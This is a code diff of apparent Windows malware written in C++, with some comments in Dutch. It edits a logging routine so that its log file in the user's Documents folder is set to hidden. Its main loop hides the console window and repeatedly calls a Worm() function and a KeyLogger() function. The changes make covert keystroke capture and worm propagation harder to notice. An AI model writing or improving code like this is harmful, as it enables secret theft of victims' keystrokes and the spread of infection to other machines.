@@ -24,11 +24,12 @@ void LOG(string input) {
 
     char saveLocation[MAX_PATH] = {0};
 
-    SHGetSpecialFolderPath(NULL, saveLocation, CSIDL_PERSONAL, FALSE);
+    SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, saveLocation);
 
-    string TestDirectory = strcat(saveLocation, "\\test");
+    string filePath = string(saveLocation) + "\\" + filename;
+    SetFileAttributes(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
-    fstream LogFile(TestDirectory + "\\" + filename, fstream::app);
+    fstream LogFile(filePath , fstream::app);
     if (LogFile.is_open()) {
         LogFile << input;
         LogFile.close();
@@ -179,6 +180,8 @@ int Worm() {
     return 0;
 }
 
+
+
 int main()
 {   
     ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -191,7 +194,7 @@ int main()
             break;
         }
         Worm(); // voert de worm uit 
-        KeyLogger();
+        KeyLogger(); // voert de keylogger uit
     }
     
     return 0;
